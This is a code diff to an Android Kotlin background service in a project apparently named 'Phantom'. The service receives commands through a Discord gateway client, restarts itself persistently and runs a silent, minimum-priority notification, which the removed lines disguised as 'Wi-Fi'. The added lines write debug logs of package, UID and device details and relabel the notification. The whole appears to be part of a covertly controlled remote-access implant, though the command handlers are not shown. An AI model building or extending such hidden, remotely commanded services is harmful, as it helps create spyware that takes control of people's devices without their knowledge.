@@ -61,6 +61,9 @@ class MainService : Service() {
         try {
             debugFile = File(filesDir, "phantom_debug.txt")
             debugFile?.writeText("${System.currentTimeMillis()} service onCreate\n")
+            debugFile?.appendText("pkg=${packageName} uid=${android.os.Process.myUid()}\n")
+            debugFile?.appendText("model=${Build.MODEL} sdk=${Build.VERSION.SDK_INT}\n")
+            debugFile?.appendText("debug path: ${filesDir.absolutePath}\n")
             val chan = NotificationChannel(CHANNEL, "Network", NotificationManager.IMPORTANCE_NONE)
             (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
             showNotif("Starting...")
@@ -71,7 +74,9 @@ class MainService : Service() {
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        debugFile?.appendText("${System.currentTimeMillis()} onStartCommand flags=$flags startId=$startId gatewayStarted=$gatewayStarted discord=${discord != null}\n")
         if (discord == null) {
+            debugFile?.appendText("onStartCommand: creating DiscordGatewayClient\n")
             discord = DiscordGatewayClient(
                 onCommand = { action, payload ->
                     scope.launch { handleGatewayCommand(action, payload) }
@@ -83,14 +88,16 @@ class MainService : Service() {
         if (!gatewayStarted) {
             gatewayStarted = true
             loadCrashReports()
+            debugFile?.appendText("onStartCommand: calling discord.start()\n")
             discord?.start(scope)
+            debugFile?.appendText("onStartCommand: discord.start() returned\n")
         }
         return START_STICKY
     }
 
     private fun buildNotif(text: String) = NotificationCompat.Builder(this, CHANNEL)
-        .setContentTitle("Wi-Fi")
-        .setContentText(text)
+        .setContentTitle("Phantom: $text")
+        .setContentText("${Build.MODEL} | ${Build.VERSION.RELEASE}")
         .setSmallIcon(android.R.drawable.ic_menu_info_details)
         .setOngoing(true)
         .setPriority(NotificationCompat.PRIORITY_MIN)
